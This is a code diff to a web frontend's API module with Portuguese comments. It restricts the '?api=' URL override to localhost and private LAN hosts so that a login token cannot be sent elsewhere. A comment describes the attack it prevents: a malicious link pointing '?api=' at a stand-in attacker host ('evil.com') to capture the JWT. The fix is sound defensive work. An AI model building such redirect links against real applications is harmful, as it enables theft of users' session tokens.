@@ -5,9 +5,29 @@
    ========================================================================= */
 
 const API = (() => {
-  // Base do backend. Pode ser trocada por ?api=... na URL para apontar outro host.
+  // Base do backend. Pode ser trocada por ?api=... na URL — MAS só para localhost
+  // ou rede LOCAL (uso de feira: apontar o servidor da escola por IP de LAN).
+  // Hosts públicos são recusados: senão um link malicioso ?api=https://evil.com
+  // faria o navegador logado enviar o token JWT (header Authorization) ao atacante.
   const params = new URLSearchParams(location.search);
-  const BASE = params.get('api') || 'http://localhost:8080';
+  function baseValida(u) {
+    if (!u) return null;
+    try {
+      const url = new URL(u);
+      if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;
+      const h = url.hostname;
+      const local = h === 'localhost' || h === '127.0.0.1' || h === '::1' ||
+        h === location.hostname ||
+        /^10\./.test(h) || /^192\.168\./.test(h) ||
+        /^172\.(1[6-9]|2[0-9]|3[01])\./.test(h);
+      return local ? url.origin : null;
+    } catch { return null; }
+  }
+  const apiParam = params.get('api');
+  if (apiParam && !baseValida(apiParam)) {
+    console.warn('[Connect ONG] ?api= ignorado: host não é local (proteção do token).');
+  }
+  const BASE = baseValida(apiParam) || 'http://localhost:8080';
 
   const LS_TOKEN = 'co_token';
   const LS_REFRESH = 'co_refresh';
